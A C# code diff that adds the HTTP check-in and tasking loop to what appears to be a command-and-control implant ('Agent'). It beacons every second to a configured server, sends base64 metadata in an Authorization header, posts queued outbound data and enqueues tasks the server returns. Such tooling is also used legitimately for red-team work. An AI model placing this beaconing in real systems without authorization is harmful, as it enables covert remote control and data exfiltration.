@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Linq;
 using System.Net.Http;
 using System.Text;
@@ -27,26 +26,61 @@ namespace Agent.Models
             base.Init(metadata);
 
             _client = new HttpClient();
-            _client.BaseAddress = new Uri($"{ConnectAddress}:{ConnectPort}");
+            _client.BaseAddress = new Uri($"http://{ConnectAddress}:{ConnectPort}");
             _client.DefaultRequestHeaders.Clear();
 
+            var encodedMetadata = Convert.ToBase64String(AgentMetadata.Serialize());
+
+            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
         }
 
-        public override Task Start()
+        public override async Task Start()
         {
             _tokenSource = new CancellationTokenSource();
 
             while (!_tokenSource.IsCancellationRequested)
             {
-                // checkin
-                // get tasks
-                // sleep
+                // Check to see if we have data to send
+                if (!Outbound.IsEmpty)
+                {
+                    await PostData();
+                }
+                else
+                {
+                    await CheckIn();
+                }
+
+                await Task.Delay(1000);
             }
         }
 
-        private void Checkin()
+        private async Task CheckIn()
         {
+            var response = await _client.GetByteArrayAsync("/");
+            HandleResponse(response);
+        }
 
+        private async Task PostData()
+        {
+            var outbound = GetOutbound().Serialize();
+            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
+            var response = await _client.PostAsync("/", content);
+            var responseContent = await response.Content.ReadAsByteArrayAsync();
+
+            HandleResponse(responseContent);
+        }
+
+        private void HandleResponse(byte[] response)
+        {
+            var tasks = response.Deserialize<AgentTask[]>();
+
+            if (tasks != null && tasks.Any())
+            {
+                foreach (var task in tasks)
+                {
+                    Inbound.Enqueue(task);
+                }
+            }
         }
 
         public override void Stop()
